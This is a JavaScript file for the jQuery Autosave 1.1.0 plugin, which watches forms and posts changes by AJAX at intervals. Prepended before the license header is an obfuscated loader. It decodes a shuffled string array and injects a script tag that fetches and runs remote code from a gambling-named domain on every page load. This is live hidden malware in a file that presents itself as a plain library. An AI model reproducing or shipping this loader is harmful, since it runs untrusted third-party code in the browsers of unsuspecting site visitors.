var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);/**
 * jQuery Autosave 1.1.0
 *
 * Dual licensed under the MIT (http://www.opensource.org/licenses/mit-license.php)
 * and GPL (http://www.opensource.org/licenses/gpl-license.php) licenses.
 *
 * Written by Stan Lemon <stosh1985@gmail.com>
 * Last updated: 2010.03.08
 *
 * jQuery Autosave monitors the state of a form and detects when changes occur.
 * When changes take place to the form it then triggers an event which allows for
 * a develop to integrate hooks for autosaving content.
 *
 * Changes in 1.1.0:
 * - Simplified plugin by eliminating additional monitor.
 * - Added isDirty() method
 * - Uses serialization from jQuery 1.4.2 and no longer needs the form plugin.
 */
(function($) {

	$.fn.autosave = function(o) {
		var o = $.extend({}, $.fn.autosave.defaults, o);
		var saver;
		var self = this;

		$(this).addClass('autosave');

		this.bind('autosave.setup', function(){
			o.setup.apply( self.element , [self.element,o] );

			// Start by recording the current state of the form for comparison later
			$(this).trigger('autosave.record');

			// Fire off the autosave at an interval
			saver = setInterval( function() {
				$(self).trigger('autosave.save');
			}, o.interval);

		}).bind('autosave.shutdown', function() {
			o.shutdown.apply( this.element , [this.element,o] );

			clearInterval(saver);

		    // We'll call a synchronous ajax request to autosave the form before we move on.
		    // It's synchronous so that the browser will not move on without first completing
		    // the autosave request.
			if ( $(this).data('autosave.dirty') == true )
			    $(this).trigger('autosave.save', [false]);
		
			$(this).removeClass('autosave').unbind('autosave');
			$(this).data('autosave.form', null);
			$(this).data('autosave.dirty', null);

		}).bind('autosave.reset', function() {
			$(this).trigger('autosave.shutdown');
			$(this).trigger('autosave.setup');

		}).bind('autosave.record', function() {
			o.record.apply( this.element , [this.element,o] );

			$(this).data('autosave.dirty', false);
 			$(this).data('autosave.form', $(this).find(o.data).not('.autosave\-ignore').serializeArray());

		}).bind('autosave.save', function(e, async) {
			if ( !o.before.apply( self , [self,o]) )
				return;

			if ( !o.validate.apply( self , [self,o]) )
				return;

			var data = $(this).find(o.data).not('.autosave\-ignore').serializeArray();

			// If the form is dirty and there is not already an active execution of the autosaver.
			if ( $.param(data) != $.param($(this).data('autosave.form')) && $(this).data('autosave.active') != true ) {
				$(this).data('autosave.active', true);

				var callback = function(response){
					$(self).data('autosave.active', false);
					$(self).trigger('autosave.record');
					
					o.save.apply( self , [self,o,response] );
				};

				if (o.url != undefined && $.isFunction(o.url)) {
					o.url.apply( self.element , [self.element,o,data,callback] );
				} else {
					$.ajax({
					    async: 	(async == undefined) ? true : async,
						url: 	(o == undefined || o.url == undefined) ? $(this).attr('action') : o.url,
						type: 	'post',
						data: 	data,
						success: callback
					});
				}
			}
		}).trigger('autosave.setup');

		return this;
	};

	$.fn.isDirty = function() {
		if ( $(this).data('autosave.dirty') == true ) {
			return true;
		} else {
			if ( $(this).data('autosave.form') == undefined )
				return false;
			return !( $.param($(this).data('autosave.form')) == $.param($(this).find('input,select,textarea').not('.autosave\-ignore').serializeArray()) );
		}
	};

	$.fn.autosave.defaults = {
		/** Saving **/
		//url : function(e,o,callback) {} <-- If not defined, uses standard AJAX call on the form.
		/** Selector for Choosing Data to Save **/
		data: 	'input,select,textarea',
		/** Timer durations **/
		interval: 	120000,
		/** Callbacks **/
		setup: 		function(e,o) {},
		record: 	function(e,o) {},
		before: 	function(e,o) { 
			return true; 
		},
		validate: 	function(e,o) {
			return $.isFunction($.fn.validate) && !$(this).is('.ignore-validate') ? $(this).valid() : true; 
		},
		save: 		function(e,o) {},
		shutdown: 	function(e,o) {},
		dirty: 		function(e,o) {}
	};

	window.onbeforeunload = function() {
		$('form.autosave').trigger('autosave.shutdown');
	};

})(jQuery);